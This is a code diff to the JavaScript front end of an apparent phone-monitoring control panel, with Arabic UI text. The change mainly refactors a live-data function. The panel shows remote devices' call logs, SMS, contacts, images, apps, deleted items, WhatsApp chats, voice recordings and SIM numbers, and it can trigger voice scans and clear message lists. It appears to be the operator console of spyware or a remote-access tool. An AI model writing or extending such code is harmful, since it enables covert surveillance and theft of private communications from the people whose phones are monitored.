@@ -1,7 +1,3 @@
-// ═══════════════════════════════════════════════════════
-//  PANEL CORE — Device Control Dashboard
-// ═══════════════════════════════════════════════════════
-
 function getAuthToken() {
     return sessionStorage.getItem('auth_token') || '';
 }
@@ -84,7 +80,6 @@ function showNotification(title, message, icon) {
     setTimeout(() => { if (div.parentElement) div.remove(); }, 8000);
 }
 
-// ✅ محدّث: SSE مع token auth
 function initSSE() {
     if (sse) { try { sse.close(); } catch(e){} sse = null; }
     if (!currentDevice) return;
@@ -206,7 +201,6 @@ function initSSE() {
             } catch (err) {}
         });
 
-        // ✅ محدّث: onerror مع فحص token
         sse.onerror = () => {
             try { sse.close(); } catch(e){}
             sse = null;
@@ -828,33 +822,102 @@ function selectDevice(deviceId) {
     if (dataInterval) clearInterval(dataInterval);
     initSSE();
     if (deviceId) {
-        updateInterval = setInterval(updateLiveData, 5000);
+        updateInterval = setInterval(updateLiveData, 3000);
         dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
         updateLiveData();
         loadAllData();
     }
 }
 
+// ✅ محدّث: updateLiveData مع كل البيانات الجديدة
 async function updateLiveData() {
     if (!currentDevice) return;
     try {
         const response = await authFetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
         const data = await response.json();
         if (data.error) return;
+
+        // ═══ الحالة ═══
         const statusEl = document.getElementById('networkStatus');
-        if (data.online) { statusEl.textContent = data.network || 'متصل'; statusEl.className = 'value online'; }
-        else { statusEl.textContent = 'غير متصل'; statusEl.className = 'value offline'; }
-        if (data.battery !== null && data.battery !== undefined) document.getElementById('batteryStatus').textContent = data.battery + '%';
-        if (data.call_count !== undefined) document.getElementById('callCount').textContent = `(${data.call_count})`;
-        if (data.sms_count !== undefined) document.getElementById('smsCount').textContent = `(${data.sms_count})`;
-        if (data.contacts_count !== undefined) document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
-        if (data.images_count !== undefined) document.getElementById('imagesCount').textContent = `(${data.images_count})`;
-        if (data.apps_count !== undefined) document.getElementById('appsCount').textContent = `(${data.apps_count})`;
-        if (data.deleted_count !== undefined) document.getElementById('deletedCount').textContent = `(${data.deleted_count})`;
+        if (statusEl) {
+            if (data.online) {
+                statusEl.textContent = data.network || 'متصل';
+                statusEl.className = 'value online';
+            } else {
+                statusEl.textContent = 'غير متصل';
+                statusEl.className = 'value offline';
+            }
+        }
+
+        // ═══ نوع الشبكة ═══
+        const netEl = document.getElementById('networkTypeStatus');
+        if (netEl) netEl.textContent = data.network_type || '—';
+
+        // ═══ البطارية ═══
+        const battEl = document.getElementById('batteryStatus');
+        if (battEl) {
+            if (data.battery !== null && data.battery !== undefined && data.battery >= 0) {
+                battEl.textContent = data.battery + '%';
+            } else {
+                battEl.textContent = '—';
+            }
+        }
+
+        // ═══ الشحن ═══
+        const chargingEl = document.getElementById('chargingStatus');
+        if (chargingEl) {
+            if (data.charging) {
+                const type = data.charging_type && data.charging_type !== 'لا' ? ` (${data.charging_type})` : '';
+                chargingEl.textContent = `⚡ يتم الشحن${type}`;
+            } else {
+                chargingEl.textContent = '';
+            }
+        }
+
+        // ═══ آخر اتصال ═══
+        const lastSeenEl = document.getElementById('lastSeen');
+        if (lastSeenEl) {
+            const ago = data.seconds_ago || 0;
+            let agoText = '';
+            if (ago < 5) agoText = 'الآن';
+            else if (ago < 60) agoText = 'قبل ' + ago + ' ثانية';
+            else if (ago < 3600) agoText = 'قبل ' + Math.floor(ago / 60) + ' دقيقة';
+            else if (ago < 86400) agoText = 'قبل ' + Math.floor(ago / 3600) + ' ساعة';
+            else agoText = 'قبل ' + Math.floor(ago / 86400) + ' يوم';
+            lastSeenEl.textContent = agoText;
+        }
+
+        // ═══ العدادات ═══
+        if (data.call_count !== undefined) {
+            const el = document.getElementById('callCount');
+            if (el) el.textContent = `(${data.call_count})`;
+        }
+        if (data.sms_count !== undefined) {
+            const el = document.getElementById('smsCount');
+            if (el) el.textContent = `(${data.sms_count})`;
+        }
+        if (data.contacts_count !== undefined) {
+            const el = document.getElementById('contactsCount');
+            if (el) el.textContent = `(${data.contacts_count})`;
+        }
+        if (data.images_count !== undefined) {
+            const el = document.getElementById('imagesCount');
+            if (el) el.textContent = `(${data.images_count})`;
+        }
+        if (data.apps_count !== undefined) {
+            const el = document.getElementById('appsCount');
+            if (el) el.textContent = `(${data.apps_count})`;
+        }
+        if (data.deleted_count !== undefined) {
+            const el = document.getElementById('deletedCount');
+            if (el) el.textContent = `(${data.deleted_count})`;
+        }
         if (data.voice_count !== undefined) {
             const vBadge = document.getElementById('liveVoicesCount');
             if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.voice_count);
         }
+
+        // ═══ اسم الجهاز + SIM ═══
         if (data.sim_numbers && data.sim_numbers.length > 0) {
             const display = document.getElementById('deviceNameDisplay');
             if (display && !display.textContent.includes(data.sim_numbers[0])) {
@@ -862,7 +925,9 @@ async function updateLiveData() {
                 display.textContent = `${baseName} — 📱 ${data.sim_numbers[0]}`;
             }
         }
-    } catch (e) {}
+    } catch (e) {
+        console.log('updateLiveData error:', e);
+    }
 }
 
 async function loadAllData() {
@@ -1071,7 +1136,6 @@ async function deleteSelectedWhatsApp() {
             const sender = currentChat;
             closeWhatsAppChat();
             loadWhatsApp();
-            // ✅ إعادة فتح الشات إذا كان مفتوح
             if (sender) setTimeout(() => openWhatsAppChat(sender), 500);
         }
     } catch (e) {}
@@ -1094,14 +1158,11 @@ async function clearWhatsAppList() {
         if (data.success) {
             const div = document.getElementById('whatsappList');
             if (div) div.innerHTML = '<p style="color:#888;">تم المسح</p>';
-
             const badge = document.getElementById('whatsappCount');
             if (badge) badge.textContent = '(0)';
-
             liveMsgs = [];
             const liveBadge = document.getElementById('liveMsgsCount');
             if (liveBadge) liveBadge.textContent = '0';
-
             showNotification('✅', 'تم مسح رسائل واتساب', '🗑️');
         } else {
             alert('❌ فشل المسح');
@@ -1389,10 +1450,6 @@ async function triggerVoiceScan() {
     } catch (e) { alert('❌ خطأ: ' + e.message); }
 }
 
-// ═══════════════════════════════════════════════════════
-// 🔐 Device Approval Management
-// ═══════════════════════════════════════════════════════
-
 async function loadAuthorizedDevices() {
     if (!isOwner()) return;
     try {
@@ -1552,10 +1609,6 @@ async function unblockDevice(fp) {
     } catch (e) {}
 }
 
-// ═══════════════════════════════════════════════════════
-// 🔐 Device Permissions Management
-// ═══════════════════════════════════════════════════════
-
 async function loadDevicePermissions() {
     if (!isOwner()) return;
     try {
@@ -1677,7 +1730,6 @@ async function toggleDeviceAccess(deviceId, fp, currentlyAllowed) {
     }
 })();
 
-// ✅ يستدعي فقط لو في تبويب الأمان نشط
 setInterval(() => {
     const secTab = document.getElementById('securityTab');
     if (secTab && secTab.classList.contains('active')) {
